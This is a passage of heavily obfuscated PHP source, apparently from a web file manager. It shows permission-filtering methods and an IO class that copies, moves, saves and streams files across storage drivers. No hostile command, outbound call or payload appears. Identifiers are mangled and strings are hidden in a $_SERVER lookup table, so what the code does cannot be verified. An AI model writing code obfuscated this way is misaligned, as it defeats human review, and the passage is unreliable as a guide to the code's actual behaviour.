$¡ûªğçó) { continue; } if (($±öìæ»´ & $İ¿) != 0) { continue; } if (!$úÎì’ô‘) { $úÎì’ô‘ = $’û§«éƒ; continue; } if (intval($úÎì’ô‘[$é”½¥œ[489]]) < $±öìæ»´) { $úÎì’ô‘ = $’û§«éƒ; } } return $úÎì’ô‘ ? $úÎì’ô‘[$é”½¥œ[477]] : !1; } public function findAuthReadOnly() { $Ûêƒ¦Å° = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ıŞ›©ûÒ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ûêƒ¦Å°, $ıŞ›©ûÒ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ ¤á­É× =& $_SERVER[ıÚ˜š²İ]; $ÊĞÓ«‰ = parent::listData(); $ÍêëâªÃ = !1; foreach ($ÊĞÓ«‰ as $­ø³û‹Î) { if ($­ø³û‹Î[$ ¤á­É×[489]] <= 0 || $­ø³û‹Î[$ ¤á­É×[2015]] == $ ¤á­É×[231]) { continue; } if (!$ÍêëâªÃ) { $ÍêëâªÃ = $­ø³û‹Î; continue; } if ($ÍêëâªÃ[$ ¤á­É×[489]] > $­ø³û‹Î[$ ¤á­É×[489]]) { $ÍêëâªÃ = $­ø³û‹Î; } } return $ÍêëâªÃ ? $ÍêëâªÃ[$ ¤á­É×[477]] : $ ¤á­É×[12]; } public function listData($íÅâÀÔœ = false, $ÜáåÛ• = "\x73\157\x72\x74", $¸ËÕ˜¿ = false) { return parent::listData($íÅâÀÔœ, $ÜáåÛ•, $¸ËÕ˜¿); } public function update($ š¬ğ¹Ë, $×Õë¶„²) { $Ü‹º‘Ø¥ =& $_SERVER[ıÚ˜š²İ]; $€âÅôÓš = parent::listData($ š¬ğ¹Ë); $²Ó£ é§ = $this->findByName($×Õë¶„²[$Ü‹º‘Ø¥[32]]); if (!$€âÅôÓš || $²Ó£ é§ && $²Ó£ é§[$Ü‹º‘Ø¥[477]] != $€âÅôÓš[$Ü‹º‘Ø¥[477]]) { return !1; } $this->filterAuth($×Õë¶„²[$Ü‹º‘Ø¥[489]]); return parent::update($ š¬ğ¹Ë, $×Õë¶„²); } public function remove($Ø®ÑÏòü) { $’àŸÀëÔ = parent::listData($Ø®ÑÏòü); if (!$’àŸÀëÔ || $’àŸÀëÔ[$_SERVER[ıÚ˜š²İ][192]]) { return !1; } return parent::remove($Ø®ÑÏòü); } public function add($ìŸñ®… = array()) { $ëÕ†±½ƒ =& $_SERVER[ıÚ˜š²İ]; if ($this->findByName($ìŸñ®…[$ëÕ†±½ƒ[32]])) { return !1; } $Àæñ³÷ = array($ëÕ†±½ƒ[32] => $ëÕ†±½ƒ[12], $ëÕ†±½ƒ[489] => 1, $ëÕ†±½ƒ[2016] => $ëÕ†±½ƒ[2003], $ëÕ†±½ƒ[2015] => 1, $ëÕ†±½ƒ[192] => 0, $ëÕ†±½ƒ[2017] => 0); $ìŸñ®… = array_merge($Àæñ³÷, $ìŸñ®…); $ìŸñ®…[$ëÕ†±½ƒ[2017]] = $this->getSort(); $this->filterAuth($ìŸñ®…[$ëÕ†±½ƒ[489]]); return parent::insert($ìŸñ®…); } private function getSort() { $ü÷ï¿Û¼ =& $_SERVER[ıÚ˜š²İ]; $™®ºÒó« = parent::listData(); $£çİëÓ† = array_to_keyvalue($™®ºÒó«, $ü÷ï¿Û¼[12], $ü÷ï¿Û¼[2017]); return empty($£çİëÓ†) ? 0 : max($£çİëÓ†) + 1; } private function filterAuth(&$™¸ôå˜Ù) { if (!$™¸ôå˜Ù) { return; } $…Ò¹úÚà = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ò¿ŸĞ™ˆ = array(); foreach ($…Ò¹úÚà as $î‡Ó…Ÿê) { if ($™¸ôå˜Ù & $î‡Ó…Ÿê) { $ò¿ŸĞ™ˆ[] = $î‡Ó…Ÿê; } } if (in_array(self::AUTH_ROOT, $ò¿ŸĞ™ˆ)) { $™¸ôå˜Ù = array_sum($…Ò¹úÚà); return; } $Ø¤¢¥Ä¸ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ò¿ŸĞ™ˆ as $î‡Ó…Ÿê) { if (isset($Ø¤¢¥Ä¸[$î‡Ó…Ÿê])) { $ò¿ŸĞ™ˆ = array_merge($ò¿ŸĞ™ˆ, $Ø¤¢¥Ä¸[$î‡Ó…Ÿê]); } } $ò¿ŸĞ™ˆ[] = self::AUTH_SHOW; $™¸ôå˜Ù = array_sum(array_unique($ò¿ŸĞ™ˆ)); } public function sort($÷ó°ÎÖÈ, $’“€úÀ) { return parent::update($÷ó°ÎÖÈ, $’“€úÀ); } } goto CµÚğ–§í; bÌŞÖ¹»ã÷: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ê¬±Ñ¤ê, $‹ÜÒ‹‘ç) { $¤É˜‹˜ì =& $_SERVER[ıÚ˜š²İ]; $ÎıåÀ¦û = $‹ÜÒ‹‘ç; $GLOBALS[$¤É˜‹˜ì[1239]] = $¤É˜‹˜ì[1240] . $Ê¬±Ñ¤ê; Hook::trigger($¤É˜‹˜ì[1240] . $Ê¬±Ñ¤ê . $¤É˜‹˜ì[1241], $ÎıåÀ¦û); $ı“à­’¼ = self::driverMake($‹ÜÒ‹‘ç[0]); if (!$ı“à­’¼) { return !1; } if (method_exists($ı“à­’¼, $Ê¬±Ñ¤ê)) { $è¯ŸÊ¤î = @call_user_func_array(array($ı“à­’¼, $Ê¬±Ñ¤ê), $‹ÜÒ‹‘ç); } else { if (method_exists($ı“à­’¼, $¤É˜‹˜ì[1242])) { $è¯ŸÊ¤î = @call_user_func_array(array($ı“à­’¼, $Ê¬±Ñ¤ê), $‹ÜÒ‹‘ç); } else { if (method_exists(self, $Ê¬±Ñ¤ê)) { $è¯ŸÊ¤î = @call_user_func_array(array(self, $Ê¬±Ñ¤ê), $‹ÜÒ‹‘ç); } else { $è¯ŸÊ¤î = call_user_func_array(array(parent, $Ê¬±Ñ¤ê), $‹ÜÒ‹‘ç); } } } Hook::trigger($¤É˜‹˜ì[1240] . $Ê¬±Ñ¤ê . $¤É˜‹˜ì[1243], $ÎıåÀ¦û, $è¯ŸÊ¤î); return $è¯ŸÊ¤î; } public static function init($£òñ¥µ) { return self::driverMake($£òñ¥µ); } public static function copy($ÈÉ°’Ùó, $Ã”èô¥, $¤ºÊ®‘ = false, $ ö‡º÷Ğ = false) { return self::copyMoveStart($ÈÉ°’Ùó, $Ã”èô¥, $¤ºÊ®‘, $_SERVER[ıÚ˜š²İ][625], $ ö‡º÷Ğ); } public static function move($¦îèûúÙ, $‘Áæšæ, $…Ğôòçì = false, $¹ã¡Ãã  = false) { return self::copyMoveStart($¦îèûúÙ, $‘Áæšæ, $…Ğôòçì, $_SERVER[ıÚ˜š²İ][627], $¹ã¡Ãã ); } public static function copyMoveChildren($‰«ßñç‹, $ÚöŸ×, $ìõç¶™¯ = "\143\x6f\x70\x79", $ŞŸà§ëü = REPEAT_REPLACE) { $Ö°êÉ˜– =& $_SERVER[ıÚ˜š²İ]; $üÙı©á = $‰«ßñç‹; $™“ëûÆš = self::driverMake($‰«ßñç‹); $‹¿‚êÌù = $™“ëûÆš->listPath($‰«ßñç‹, !0); $ëÔˆŸÒê = array_merge($‹¿‚êÌù[$Ö°êÉ˜–[86]], $‹¿‚êÌù[$Ö°êÉ˜–[85]]); foreach ($ëÔˆŸÒê as $®°³ßÍÖ) { self::copyMoveStart($®°³ßÍÖ[$Ö°êÉ˜–[87]], $ÚöŸ×, $ŞŸà§ëü, $ìõç¶™¯, !1); } if ($ìõç¶™¯ == $Ö°êÉ˜–[627]) { self::remove($üÙı©á); } } private static function copyMoveStart($¤¯·Ó—Ø, $‚íùÁôŒ, $·­¥ƒÖ , $İ™™¤ï–, $´‰Óİß¼) { $«ï€®Ûö =& $_SERVER[ıÚ˜š²İ]; $“¼¯”‰‹ = array($¤¯·Ó—Ø, $‚íùÁôŒ, $·­¥ƒÖ , $´‰Óİß¼); Hook::trigger($«ï€®Ûö[1240] . $İ™™¤ï– . $«ï€®Ûö[1241], $“¼¯”‰‹); $Û¤ÖÔö€ = self::copyMove($¤¯·Ó—Ø, $‚íùÁôŒ, $·­¥ƒÖ , $İ™™¤ï–, $´‰Óİß¼); Hook::trigger($«ï€®Ûö[1240] . $İ™™¤ï– . $«ï€®Ûö[1243], $“¼¯”‰‹, $Û¤ÖÔö€); return $Û¤ÖÔö€; } public static function saveFile($îÊ­Üâ, $­û•ÊÕÚ, $ÒÕí¸¡ = true) { $çš™¨£‚ =& $_SERVER[ıÚ˜š²İ]; $ŸÃåÂÙ­ = self::info($­û•ÊÕÚ); $»å¿Áº— = self::driverMake($îÊ­Üâ); $›èö¨Åû = self::driverMake($­û•ÊÕÚ); $§‚™Ÿç÷ = !1; if ($›èö¨Åû->pathParse[$çš™¨£‚[1244]]) { $§‚™Ÿç÷ = $›èö¨Åû; $îñû‚Ê = $›èö¨Åû->pathParse[$çš™¨£‚[1244]]; $›èö¨Åû = self::driverMake($îñû‚Ê); } if ($»å¿Áº—->pathParse[$çš™¨£‚[1244]]) { $È„àã‰ = $»å¿Áº—->pathParse[$çš™¨£‚[1244]]; $»å¿Áº— = self::driverMake($È„àã‰); } $òÊˆ»ƒ¦ = $›èö¨Åû->pathFather($­û•ÊÕÚ); $®–êÄÌ = !0; if (!$ÒÕí¸¡ && self::driverIsSame($»å¿Áº—, $›èö¨Åû)) { $®–êÄÌ = !1; } $­°ÂÖ³© = self::copyFile($»å¿Áº—, $îÊ­Üâ, $›èö¨Åû, $òÊˆ»ƒ¦, $ŸÃåÂÙ­[$çš™¨£‚[32]], $®–êÄÌ); if ($§‚™Ÿç÷) { $­°ÂÖ³© = $§‚™Ÿç÷->getPathOuter($­°ÂÖ³©); } return $­°ÂÖ³©; } private static function copyMove($›£Úè×ˆ, $¿šÉªßó, $¸úøšÂ‡, $ñêÑê•¼, $»Ğåü•¸ = false) { $ó¿¨„ê =& $_SERVER[ıÚ˜š²İ]; if (!$›£Úè×ˆ || $›£Úè×ˆ == $ó¿¨„ê[8] || !$¿šÉªßó) { return !1; } ignore_timeout(); $¤Òõ¾íŸ = self::driverMake($›£Úè×ˆ); $Äç¢İÒ = self::driverMake($¿šÉªßó); $ßµøØ˜Ğ = $ñêÑê•¼ == $ó¿¨„ê[627]; $¯ÀË¢–ó = !1; if ($Äç¢İÒ->pathParse[$ó¿¨„ê[1244]]) { $¯ÀË¢–ó = $Äç¢İÒ; $¿šÉªßó = $Äç¢İÒ->pathParse[$ó¿¨„ê[1244]]; $Äç¢İÒ = self::driverMake($¿šÉªßó); } if ($¤Òõ¾íŸ->pathParse[$ó¿¨„ê[1244]]) { $›£Úè×ˆ = $¤Òõ¾íŸ->pathParse[$ó¿¨„ê[1244]]; $¤Òõ¾íŸ = self::driverMake($›£Úè×ˆ); } self::check($¤Òõ¾íŸ, $›£Úè×ˆ, $Äç¢İÒ, $¿šÉªßó); Hook::trigger($ó¿¨„ê[1245], $¤Òõ¾íŸ, $›£Úè×ˆ, $Äç¢İÒ, $¿šÉªßó); $˜Çéè¿Ì = self::driverIsSame($¤Òõ¾íŸ, $Äç¢İÒ); if ($˜Çéè¿Ì) { if ($ñêÑê•¼ == $ó¿¨„ê[627] && !method_exists($Äç¢İÒ, $ó¿¨„ê[1246]) && trim($¿šÉªßó, $ó¿¨„ê[8]) == trim($Äç¢İÒ->pathFather($›£Úè×ˆ), $ó¿¨„ê[8])) { if ($¤Òõ¾íŸ->pathThis($›£Úè×ˆ) != $»Ğåü•¸ && !$¤Òõ¾íŸ->isOsDriver()) { return $¤Òõ¾íŸ->rename($›£Úè×ˆ, $»Ğåü•¸); } return $Äç¢İÒ->getPathOuter($›£Úè×ˆ); } if (method_exists($Äç¢İÒ, $ñêÑê•¼)) { return $Äç¢İÒ->{$ñêÑê•¼}($›£Úè×ˆ, $¿šÉªßó, $¸úøšÂ‡, $»Ğåü•¸); } } if ($˜Çéè¿Ì && $ñêÑê•¼ == $ó¿¨„ê[627] && $Äç¢İÒ->getType() == $ó¿¨„ê[109]) { $©õŸåÅÕ = $Äç¢İÒ->movePath($›£Úè×ˆ, $¿šÉªßó, $»Ğåü•¸); if ($©õŸåÅÕ) { return $©õŸåÅÕ; } } $òÒÅ°Òë = $¤Òõ¾íŸ->isFile($›£Úè×ˆ); if (!$òÒÅ°Òë && $Äç¢İÒ->getType() == $ó¿¨„ê[834] && $¤Òõ¾íŸ->getType() == $ó¿¨„ê[109]) { $©õŸåÅÕ = $Äç¢İÒ->copyFolderFromIO($¤Òõ¾íŸ, $›£Úè×ˆ, $¿šÉªßó, $¸úøšÂ‡, $ßµøØ˜Ğ, $»Ğåü•¸); } else { $©õŸåÅÕ = self::copyPath($¤Òõ¾íŸ, $›£Úè×ˆ, $Äç¢İÒ, $¿šÉªßó, $¸úøšÂ‡, $ßµøØ˜Ğ, $òÒÅ°Òë, $»Ğåü•¸); } if ($©õŸåÅÕ && $ßµøØ˜Ğ) { $¤Òõ¾íŸ->remove($›£Úè×ˆ); } if ($¯ÀË¢–ó) { $©õŸåÅÕ = $¯ÀË¢–ó->getPathOuter($©õŸåÅÕ); } return $©õŸåÅÕ; } private static function check($„ÂÏœÔº, $şîŞÜƒ, $á¡İ¤ş‚, &$„»È†¦Ò) { $Ü¿ìñËÆ =& $_SERVER[ıÚ˜š²İ]; if (self::driverIsSame($„ÂÏœÔº, $á¡İ¤ş‚) && $„ÂÏœÔº->isFolder($şîŞÜƒ) && $„ÂÏœÔº->isParentOf($şîŞÜƒ, $„»È†¦Ò)) { show_json(LNG($Ü¿ìñËÆ[1247]), !1); } if (!$„ÂÏœÔº->exist($şîŞÜƒ)) { show_json(LNG($Ü¿ìñËÆ[108]), !1); } } private static function copyPath($ëÖé÷æ, $²Í‚ñıó, $ÏöåÈ¡, $Ò×°á€¹, $ÓÌéö, $Ï—Á®ÔŞ, $ÇËûªñ¾, $Ğ‰ËğöÙ = false, $şîˆËğ¦ = true) { $¢Ïû¸ü =& $_SERVER[ıÚ˜š²İ]; $ÃÜ™ı° = empty($Ğ‰ËğöÙ) && $Ğ‰ËğöÙ !== $¢Ïû¸ü[231] ? $ëÖé÷æ->pathThis($²Í‚ñıó) : $Ğ‰ËğöÙ; if ($ÓÌéö) { $ŒÈ ÁÇæ = $ÏöåÈ¡->fileNameExist($Ò×°á€¹, $ÃÜ™ı°); $ë˜£‹Ş» = $ÃÜ™ı°; $ÃÜ™ı° = $ÏöåÈ¡->fileNameAuto($Ò×°á€¹, $ÃÜ™ı°, $ÓÌéö, !$ÇËûªñ¾); if (!$ŒÈ ÁÇæ || $ë˜£‹Ş» != $ÃÜ™ı°) { $ÓÌéö = !1; } if ($şîˆËğ¦ && !$ÓÌéö) { $ÏöåÈ¡->_data[$¢Ïû¸ü[1248]] = !0; } } if ($ÇËûªñ¾) { return self::copyFile($ëÖé÷æ, $²Í‚ñıó, $ÏöåÈ¡, $Ò×°á€¹, $ÃÜ™ı°, $Ï—Á®ÔŞ); } if ($ÓÌéö == REPEAT_RENAME_FOLDER) { $ÓÌéö = !1; } $ÊÁØÌÂ = rtrim($Ò×°á€¹, $¢Ïû¸ü[8]) . $¢Ïû¸ü[8] . $ÃÜ™ı°; $äÃÛÚğ = $ÏöåÈ¡->mkdir($ÏöåÈ¡->getPath($ÊÁØÌÂ), $ÓÌéö); $Ò×°á€¹ = $ÏöåÈ¡->getPathInner($äÃÛÚğ); $ëùÌ›Ò = $ëÖé÷æ->listPath($²Í‚ñıó, !0); $ëùÌ›Ò = is_array($ëùÌ›Ò) ? $ëùÌ›Ò : array($¢Ïû¸ü[86] => array(), $¢Ïû¸ü[85] => array()); $íŸ©÷ø = array_merge($ëùÌ›Ò[$¢Ïû¸ü[86]], $ëùÌ›Ò[$¢Ïû¸ü[85]]); foreach ($íŸ©÷ø as $àÔá¨˜Ÿ) { $áì‰áş¾ = $àÔá¨˜Ÿ[$¢Ïû¸ü[33]] == $¢Ïû¸ü[233]; $²Í‚ñıó = $ëÖé÷æ->getPathInner($àÔá¨˜Ÿ[$¢Ïû¸ü[87]]); $Ö®†Èˆ† = self::copyPath($ëÖé÷æ, $²Í‚ñıó, $ÏöåÈ¡, $Ò×°á€¹, $ÓÌéö, $Ï—Á®ÔŞ, $áì‰áş¾, !1, !1); if (!$Ö®†Èˆ†) { IO::errorTips($¢Ïû¸ü[1249] . $²Í‚ñıó . $¢Ïû¸ü[73] . $Ò×°á€¹); } } self::copyMoveKeepInfo($ëÖé÷æ, $²Í‚ñıó, $äÃÛÚğ); return $äÃÛÚğ; } private static function copyFile($ŞÈ§ıË±, $Ú¾ò®ˆ„, $Šø­¢’ô, $‰“êæ¡ô, $ÉÔÈ†ëª, $¿üáêû) { $à¬ŸãÆä =& $_SERVER[ıÚ˜š²İ]; $‰“êæ¡ô = $Šø­¢’ô->getPath(rtrim($‰“êæ¡ô, $à¬ŸãÆä[8]) . $à¬ŸãÆä[8] . $ÉÔÈ†ëª); $á¡‚æúö = $à¬ŸãÆä[1250] . time() . rand_string(5); Hook::trigger($à¬ŸãÆä[1251], $ŞÈ§ıË±, $Ú¾ò®ˆ„, $Šø­¢’ô, $‰“êæ¡ô, $ÉÔÈ†ëª, $á¡‚æúö); if (self::driverIsSame($ŞÈ§ıË±, $Šø­¢’ô)) { if ($¿üáêû) { $¾Ì°å¬ = $Šø­¢’ô->moveFile($Ú¾ò®ˆ„, $‰“êæ¡ô); } else { $¾Ì°å¬ = $Šø­¢’ô->copyFile($Ú¾ò®ˆ„, $‰“êæ¡ô); } Hook::trigger($à¬ŸãÆä[1252], $ŞÈ§ıË±, $Ú¾ò®ˆ„, $Šø­¢’ô, $‰“êæ¡ô, $ÉÔÈ†ëª, $¾Ì°å¬); self::copyMoveKeepInfo($ŞÈ§ıË±, $Ú¾ò®ˆ„, $¾Ì°å¬); return $¾Ì°å¬; } $®è¿Àü§ = TEMP_FILES; if ($GLOBALS[$à¬ŸãÆä[6]][$à¬ŸãÆä[92]][$à¬ŸãÆä[875]]) { $®è¿Àü§ = $GLOBALS[$à¬ŸãÆä[6]][$à¬ŸãÆä[92]][$à¬ŸãÆä[875]]; } $«ü˜åÜ  = $®è¿Àü§; mk_dir($«ü˜åÜ ); $·×Ê¾òå = $«ü˜åÜ  . $á¡‚æúö; $´øÆ¸¤Ã = $·×Ê¾òå; $·×Ê¾òå = $ŞÈ§ıË±->download($Ú¾ò®ˆ„, $·×Ê¾òå); $·×Ê¾òå = $ŞÈ§ıË±->iconvApp($·×Ê¾òå); if (substr($·×Ê¾òå, strlen($®è¿Àü§)) == $®è¿Àü§) { $¿üáêû = !0; } $¾Ì°å¬ = $Šø­¢’ô->upload($‰“êæ¡ô, $·×Ê¾òå, $¿üáêû); self::remove($´øÆ¸¤Ã); Hook::trigger($à¬ŸãÆä[1252], $ŞÈ§ıË±, $Ú¾ò®ˆ„, $Šø­¢’ô, $‰“êæ¡ô, $ÉÔÈ†ëª, $¾Ì°å¬); self::copyMoveKeepInfo($ŞÈ§ıË±, $Ú¾ò®ˆ„, $¾Ì°å¬); return $¾Ì°å¬; } private static function copyMoveKeepInfo($ö®Êóıª, $¢ôÉ°şğ, $Âı¤ŸÆæ) { if (!$Âı¤ŸÆæ) { return; } $¼Ø­‰Ü­ = $ö®Êóıª->info($¢ôÉ°şğ); if (!is_array($¼Ø­‰Ü­)) { return; } IO::setModifyTime($Âı¤ŸÆæ, $¼Ø­‰Ü­[$_SERVER[ıÚ˜š²İ][88]]); } public static function pathFather($îİ†¢–) { $˜ş¸†Ìø = IO::init($îİ†¢–); $š‹™Á‡å = $˜ş¸†Ìø->pathFather($˜ş¸†Ìø->path); return $˜ş¸†Ìø->getPathOuter($š‹™Á‡å); } public static function fileOut($ìí§Íî , $Ãş©òÜ = false, $±ŒØúŸ = false, $’¤«ş¼ = '') { $Ò¥¢±û = self::driverMake($ìí§Íî ); if ($Ò¥¢±û->isFileOutServer()) { return $Ò¥¢±û->fileOutServer($ìí§Íî , $Ãş©òÜ, $±ŒØúŸ, $’¤«ş¼); } return $Ò¥¢±û->fileOut($ìí§Íî , $Ãş©òÜ, $±ŒØúŸ, $’¤«ş¼); } public static function fileOutImage($¦€Ë‘’ö, $ˆ×“­¶Í = 250) { $¬ ¸ùÚ¡ = array(250, 600, 1200, 2000, 3000, 5000); for ($ò’‘µ = 0; $ò’‘µ < count($¬ ¸ùÚ¡); $ò’‘µ++) { if ($ò’‘µ == 0 && $ˆ×“­¶Í <= $¬ ¸ùÚ¡[$ò’‘µ]) { $ˆ×“­¶Í = $¬ ¸ùÚ¡[$ò’‘µ]; break; } else { if ($ˆ×“­¶Í > $¬ ¸ùÚ¡[$ò’‘µ - 1] && $ˆ×“­¶Í <= $¬ ¸ùÚ¡[$ò’‘µ]) { $ˆ×“­¶Í = $¬ ¸ùÚ¡[$ò’‘µ]; break; } else { if ($ò’‘µ == count($¬ ¸ùÚ¡) - 1 && $ˆ×“­¶Í > $¬ ¸ùÚ¡[$ò’‘µ]) { $ˆ×“­¶Í = $¬ ¸ùÚ¡[$ò’‘µ]; break; } } } } $ñ ±Âœ = self::driverMake($¦€Ë‘’ö); if ($ñ ±Âœ->isFileOutServer()) { return $ñ ±Âœ->fileOutImageServer($¦€Ë‘’ö, $ˆ×“­¶Í); } return $ñ ±Âœ->fileOutImage($¦€Ë‘’ö, $ˆ×“­¶Í); } private static function driverIsSame($·šÏÕÂ, $¦©ì¦ñ¯) { $òªúÅ€ =& $_SERVER[ıÚ˜š²İ]; $ÑÄÔó æ = $·šÏÕÂ->getType(); $µ•Õ˜£“ = $¦©ì¦ñ¯->getType(); if ($ÑÄÔó æ != $µ•Õ˜£“) { return !1; } if ($ÑÄÔó æ == $òªúÅ€[834]) { return !0; } if ($ÑÄÔó æ == $òªúÅ€[109]) { return !0; } if ($·šÏÕÂ->pathDriver == $¦©ì¦ñ¯->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ö«öôĞ¿, $Ä£—¾š­) { $¨æ¶íæ’ =& $_SERVER[ıÚ˜š²İ]; if (!IO::exist($Ö«öôĞ¿)) { return !1; } if (!IO::exist($Ä£—¾š­)) { IO::mkdir($Ä£—¾š­); } $ÅöÖï = array_to_keyvalue(self::listAllSimple($Ö«öôĞ¿), $¨æ¶íæ’[87]); $Î¡¥×à® = array_to_keyvalue(self::listAllSimple($Ä£—¾š­), $¨æ¶íæ’[87]); $¿©‚˜æ = array(); $ŠµøíıÍ = array(); foreach ($ÅöÖï as $Ğë×©‹± => $‡ü‰Ù¼) { if (isset($Î¡¥×à®[$Ğë×©‹±])) { if ($‡ü‰Ù¼[$¨æ¶íæ’[78]] == 1) { continue; } if ($Î¡¥×à®[$Ğë×©‹±][$¨æ¶íæ’[79]] == $‡ü‰Ù¼[$¨æ¶íæ’[79]]) { continue; } } if ($‡ü‰Ù¼[$¨æ¶íæ’[78]] == 1) { $ŠµøíıÍ[] = $Ä£—¾š­ . $¨æ¶íæ’[8] . trim($Ğë×©‹±, $¨æ¶íæ’[8]); continue; } $™†»¿Ö = strstr(trim($Ğë×©‹±, $¨æ¶íæ’[8]), $¨æ¶íæ’[8]) ? get_path_father($Ğë×©‹±) : $¨æ¶íæ’[12]; $¿©‚˜æ[] = array($¨æ¶íæ’[1253] => $‡ü‰Ù¼[$¨æ¶íæ’[89]], $¨æ¶íæ’[1254] => rtrim($Ä£—¾š­, $¨æ¶íæ’[8]) . $¨æ¶íæ’[8] . $™†»¿Ö, $¨æ¶íæ’[1255] => $‡ü‰Ù¼); } $¹–İò = array($¨æ¶íæ’[233] => $¿©‚˜æ, $¨æ¶íæ’[78] => $ŠµøíıÍ); Hook::trigger($¨æ¶íæ’[1256], $Ö«öôĞ¿, $Ä£—¾š­, $¹–İò); foreach ($ŠµøíıÍ as $‡ü‰Ù¼) { IO::mkdir($‡ü‰Ù¼); } foreach ($¿©‚˜æ as $‡ü‰Ù¼) { IO::copy($‡ü‰Ù¼[$¨æ¶íæ’[1253]], $‡ü‰Ù¼[$¨æ¶íæ’[1254]], REPEAT_REPLACE); } } public static function fileSubstr($¦‚û‹Ş¦, $É ”˜Ë, $æ‰´úäÆ = false) { $±–Ü“ş =& $_SERVER[ıÚ˜š²İ]; $ååŒıİ— = self::driverMake($¦‚û‹Ş¦); $•ÁÅèõ = $ååŒıİ—->size($¦‚û‹Ş¦); $ˆ™²²íÃ = $É ”˜Ë; $¾«‘Èóü = $æ‰´úäÆ; if ($É ”˜Ë < 0) { $É ”˜Ë = $•ÁÅèõ + $É ”˜Ë; } if ($æ‰´úäÆ === !1) { $æ‰´úäÆ = $•ÁÅèõ - $É ”˜Ë; } if ($É ”˜Ë + $æ‰´úäÆ > $•ÁÅèõ) { $æ‰´úäÆ = $•ÁÅèõ - $É ”˜Ë; } if (!$•ÁÅèõ && $ååŒıİ—->getType() == $±–Ü“ş[109] && !$ååŒıİ—->exist($¦‚û‹Ş¦)) { $º½ËÓœ = get_path_this($¦‚û‹Ş¦); $¬Ô³ğôà = parse_url_query($º½ËÓœ); if (is_array($¬Ô³ğôà) && isset($¬Ô³ğôà[$±–Ü“ş[32]])) { $º½ËÓœ = urldecode($¬Ô³ğôà[$±–Ü“ş[32]]); } throw new Exception($±–Ü“ş[1257] . LNG($±–Ü“ş[1258]) . $±–Ü“ş[1055] . clear_html($º½ËÓœ) . $±–Ü“ş[12]); } if ($æ‰´úäÆ <= 0) { return $±–Ü“ş[12]; } if ($É ”˜Ë < 0 || $É ”˜Ë >= $•ÁÅèõ || $æ‰´úäÆ > $GLOBALS[$±–Ü“ş[6]][$±–Ü“ş[92]][$±–Ü“ş[1259]]) { throw new Exception("\146\x69\x6c\x65\x52\145\141\144\40\x65\x72\162\x6f\162\x2c\157\166\x65\x72\40\x69\x6f\x52\145\141\144\x4d\x61\x78\x21\x20\x73\x74\141\x72\x74\x3d{$É ”˜Ë}\73\x6c\145\x6e\147\164\150\x3d{$æ‰´úäÆ}\73\40\163\151\x7a\145\x3d{$•ÁÅèõ}\73"); } $Æ‹†€Ë§ = $ååŒıİ—->fileSubstr($¦‚û‹Ş¦, $É ”˜Ë, $æ‰´úäÆ); if (!$Æ‹†€Ë§ && $æ‰´úäÆ && isset($GLOBALS[$±–Ü“ş[1260]])) { throw new Exception($GLOBALS[$±–Ü“ş[1260]][$±–Ü“ş[1261]]); } return $Æ‹†€Ë§; } private static function driverMake(&$¹ÕŞãç») { $Ãáá•¾¹ =& $_SERVER[ıÚ˜š²İ]; $» º¾ß‘ = KodIO::parse($¹ÕŞãç»); if (!self::$driverListSystem) { $ğ¦¸Óñ = Model($Ãáá•¾¹[844])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ğ¦¸Óñ, $Ãáá•¾¹[477]); } if ($» º¾ß‘[$Ãáá•¾¹[33]] == KodIO::KOD_IO && !self::$driverListSystem[$» º¾ß‘[$Ãáá•¾¹[477]]]) { throw new Exception($Ãáá•¾¹[1262]); return !1; } $¹ÕŞãç» = $» º¾ß‘[$Ãáá•¾¹[1263]]; $úÏº²ÎÄ = self::driverGet($» º¾ß‘, $¹ÕŞãç»); return $úÏº²ÎÄ; } private static function driverGet($ŠÒä¼Ôá, &$Š˜½ï“™) { $¶¨Ï—¨ó =& $_SERVER[ıÚ˜š²İ]; $œÑÊÔì = $ŠÒä¼Ôá[$¶¨Ï—¨ó[1264]]; $ºŠÂ“Ú½ = $ŠÒä¼Ôá[$¶¨Ï—¨ó[477]]; switch ($ŠÒä¼Ôá[$¶¨Ï—¨ó[33]]) { case KodIO::KOD_IO: $éˆÍï½ = self::$driverListSystem[$ºŠÂ“Ú½]; break; case KodIO::KOD_SOURCE: $Š˜½ï“™ = $ºŠÂ“Ú½ . $Š˜½ï“™; $éˆÍï½ = array($¶¨Ï—¨ó[1265] => $¶¨Ï—¨ó[1266], $¶¨Ï—¨ó[6] => $ŠÒä¼Ôá); $éˆÍï½[$¶¨Ï—¨ó[6]][$¶¨Ï—¨ó[1267]] = $ŠÒä¼Ôá[$¶¨Ï—¨ó[477]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $óÊáòˆ” = $GLOBALS[$¶¨Ï—¨ó[1268]]; self::$driverListUser = array_to_keyvalue($óÊáòˆ”, $¶¨Ï—¨ó[477]); } $éˆÍï½ = self::$driverListUser[$ºŠÂ“Ú½]; break; case KodIO::KOD_SHARE_LINK: $éˆÍï½ = array($¶¨Ï—¨ó[1265] => $¶¨Ï—¨ó[1269], $¶¨Ï—¨ó[6] => $ŠÒä¼Ôá); $·Œ•ŞÈ = Action($¶¨Ï—¨ó[1270])->sharePathInfo($ŠÒä¼Ôá[$¶¨Ï—¨ó[87]]); $Š˜½ï“™ = $·Œ•ŞÈ[$¶¨Ï—¨ó[194]]; if (!$·Œ•ŞÈ[$¶¨Ï—¨ó[194]]) { $ÉåéÔ½Ì = Model($¶¨Ï—¨ó[671])->getInfo($·Œ•ŞÈ[$¶¨Ï—¨ó[672]]); $Š˜½ï“™ = KodIO::clear($ÉåéÔ½Ì[$¶¨Ï—¨ó[1271]] . 